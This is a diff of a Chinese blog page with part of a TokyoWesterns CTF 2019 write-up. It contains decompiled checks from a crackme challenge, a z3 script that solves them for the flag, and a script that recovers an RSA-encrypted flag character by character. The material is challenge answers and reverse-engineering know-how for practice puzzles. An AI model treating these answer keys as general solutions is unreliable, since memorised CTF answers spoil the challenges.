-<h3 id="check5"><a href="#check5" class="headerlink" title="check5"></a>check5</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">15</span>; ++jj )</span><br><span class="line">      v18 += s[<span class="number">2</span> * (jj + <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( v18 != <span class="number">1160</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check5">check5<a class="post-anchor" href="#check5"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">15</span>; ++jj )</span><br><span class="line">      v18 += s[<span class="number">2</span> * (jj + <span class="number">3</span>)];</span><br><span class="line">    <span class="keyword">if</span> ( v18 != <span class="number">1160</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="check6"><a href="#check6" class="headerlink" title="check6"></a>check6</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( s[<span class="number">37</span>] != <span class="number">0x35</span> || s[<span class="number">7</span>] != <span class="number">102</span> || s[<span class="number">11</span>] != <span class="number">0x38</span> || s[<span class="number">12</span>] != <span class="number">0x37</span> || s[<span class="number">23</span>] != <span class="number">0x32</span> || s[<span class="number">31</span>] != <span class="number">0x34</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct: %s\n"</span>, s, a2);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="check6">check6<a class="post-anchor" href="#check6"></a></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( s[<span class="number">37</span>] != <span class="number">0x35</span> || s[<span class="number">7</span>] != <span class="number">102</span> || s[<span class="number">11</span>] != <span class="number">0x38</span> || s[<span class="number">12</span>] != <span class="number">0x37</span> || s[<span class="number">23</span>] != <span class="number">0x32</span> || s[<span class="number">31</span>] != <span class="number">0x34</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"incorrect"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct: %s\n"</span>, s, a2);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>解题脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !user/bin/python2.7</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">"a%d"</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line">sum1 = [<span class="number">0x15E</span>, <span class="number">0x0DA</span>, <span class="number">0x12F</span>, <span class="number">0x131</span>, <span class="number">0x100</span>, <span class="number">0x131</span>, <span class="number">0x0FB</span>, <span class="number">0x102</span>]</span><br><span class="line">xor1 = [<span class="number">0x52</span>, <span class="number">0x0C</span>, <span class="number">1</span>, <span class="number">0x0F</span>, <span class="number">0x5C</span>, <span class="number">5</span>, <span class="number">0x53</span>, <span class="number">0x58</span>]</span><br><span class="line">sum2 = [<span class="number">0x129</span>, <span class="number">0x103</span>, <span class="number">0x12B</span>, <span class="number">0x131</span>, <span class="number">0x135</span>, <span class="number">0x10B</span>, <span class="number">0x0FF</span>, <span class="number">0x0FF</span>]</span><br><span class="line">xor2 = [<span class="number">1</span>, <span class="number">0x57</span>, <span class="number">7</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x51</span>]</span><br><span class="line">cnt = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">memcmp = [<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x80</span>, <span class="number">0xFF</span>]</span><br><span class="line">d = <span class="string">"0123456789abcdef"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(0,16):</span></span><br><span class="line"><span class="string">	s.add(str(flag).count(str(ord(d[i])))==cnt[i])</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">if</span> memcmp[j] == <span class="number">0x80</span>:</span><br><span class="line">		s.add(flag[j]&gt; <span class="number">0x60</span>)</span><br><span class="line">		s.add(flag[j]&lt;=<span class="number">0x66</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s.add(flag[j]&lt;=<span class="number">0x39</span>)</span><br><span class="line">		s.add(flag[j]&gt; <span class="number">0x2f</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag:</span><br><span class="line">	s.add(<span class="number">0x30</span>&lt;=x)</span><br><span class="line">	s.add(<span class="number">0x67</span>&gt;x)</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">1</span>]==<span class="number">102</span>)</span><br><span class="line">s.add(flag[<span class="number">5</span>]==<span class="number">0x38</span>)</span><br><span class="line">s.add(flag[<span class="number">6</span>]==<span class="number">0x37</span>)</span><br><span class="line">s.add(flag[<span class="number">17</span>]==<span class="number">0x32</span>)</span><br><span class="line">s.add(flag[<span class="number">25</span>]==<span class="number">0x34</span>)</span><br><span class="line">s.add(flag[<span class="number">31</span>]==<span class="number">0x35</span>)</span><br><span class="line"><span class="comment">#for i in range(len())</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">	s.add(flag[i]!=<span class="number">51</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">4</span>):</span><br><span class="line">	s.add(flag[i]+flag[i+<span class="number">1</span>]+flag[i+<span class="number">2</span>]+flag[i+<span class="number">3</span>]==sum1[i/<span class="number">4</span>])</span><br><span class="line">	s.add(flag[i]^flag[i+<span class="number">1</span>]^flag[i+<span class="number">2</span>]^flag[i+<span class="number">3</span>]==xor1[i/<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">	s.add(flag[i]+flag[i+<span class="number">8</span>]+flag[i+<span class="number">16</span>]+flag[i+<span class="number">24</span>]==sum2[i])</span><br><span class="line">	s.add(flag[i]^flag[i+<span class="number">8</span>]^flag[i+<span class="number">16</span>]^flag[i+<span class="number">24</span>]==xor2[i])</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">	sum += flag[i]</span><br><span class="line">s.add(sum == <span class="number">1160</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[-] check sat ·····"</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">	m = s.model()</span><br><span class="line">	<span class="keyword">print</span> m</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] print flag ·····"</span></span><br><span class="line">	kk = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">		kk +=  chr(int(<span class="string">"%s"</span> % (m[flag[i]])))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"TWCTF&#123;"</span>+kk+<span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"[+] False     ·····"</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="real-baby-rsa"><a href="#real-baby-rsa" class="headerlink" title="real baby rsa"></a>real baby rsa</h2><p>加密是逐个字符加密<br>我们可以加密所有可见字符<br>然后对比出flag</p>
+<h2 id="real-baby-rsa">real baby rsa<a class="post-anchor" href="#real-baby-rsa"></a></h2><p>加密是逐个字符加密<br>我们可以加密所有可见字符<br>然后对比出flag</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">'TWCTF&#123;CENSORED&#125;'</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="comment"># Public Parameters</span></span><br><span class="line">N = <span class="number">36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># Encrypt the flag!</span></span><br><span class="line"><span class="string">for char in flag:</span></span><br><span class="line"><span class="string">    print(pow(ord(char), e, N))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">dic = <span class="string">"TWCTF&#125;&#123;QWERTYUIOPASDFGHJKLZXCVBNM?/&gt;&lt;.,:;\"\'[]qwertyuiopasdfghjklzxcvbnm0123456789!@#$%^&amp;*()_-+=~`"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">		xx = line.rstrip()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">			zz = str(pow(ord(i),e,N))</span><br><span class="line">			<span class="keyword">if</span> xx[:<span class="number">600</span>] == zz[:<span class="number">600</span>]:</span><br><span class="line">				flag += i</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
 
-</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://pumpkin9.github.io">pumpkin9</a></p><p> <span>Link:  </span><a href="http://pumpkin9.github.io/2019/09/02/TokyoWesternsCTF-2019-writeup/">http://pumpkin9.github.io/2019/09/02/TokyoWesternsCTF-2019-writeup/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/10/10/Off-By-One学习/" title="Off-By-One学习"><span>< PreviousPost</span><br><span class="prevTitle">Off-By-One学习</span></a><a class="nextSlogan" href="/2019/07/17/2019强网杯-copperstudy/" title="2019强网杯-copperstudy"><span>NextPost ></span><br><span class="nextTitle">2019强网杯-copperstudy</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup"><span class="toc-number">1.</span> <span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-crackme"><span class="toc-number">2.</span> <span class="toc-text">easy_crackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#check1"><span class="toc-number">2.1.</span> <span class="toc-text">check1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check2"><span class="toc-number">2.2.</span> <span class="toc-text">check2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check3"><span class="toc-number">2.3.</span> <span class="toc-text">check3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check4"><span class="toc-number">2.4.</span> <span class="toc-text">check4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check5"><span class="toc-number">2.5.</span> <span class="toc-text">check5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#check6"><span class="toc-number">2.6.</span> <span class="toc-text">check6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#real-baby-rsa"><span class="toc-number">3.</span> <span class="toc-text">real baby rsa</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
+
+
+  
+    <div class="post-reward">
+    <div id="reward-button">打赏</div>
+      <div id="qr">
+        <div class="wrap">
+            
+            <div class="bg-wrap">
+              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
+              支付宝
+            </div>
+            
+            
+            <div class="bg-wrap">
+                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
+              微信
+            </div>
+            
+        </div>
+      </div>
+    </div>
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+          <a href="/2019/10/10/Off-By-One学习/">Off-By-One学习</a>
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2019/07/17/2019强网杯-copperstudy/">2019强网杯-copperstudy</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="http://pumpkin9.github.io">pumpkin9</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="http://pumpkin9.github.io/2019/09/02/TokyoWesternsCTF-2019-writeup/">http://pumpkin9.github.io/2019/09/02/TokyoWesternsCTF-2019-writeup/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="http://pumpkin9.github.io">pumpkin9</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2019
+            <a href="http://pumpkin9.github.io">pumpkin9</a> Powered by <a href="https://hexo.io">Hexo</a> |
+            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
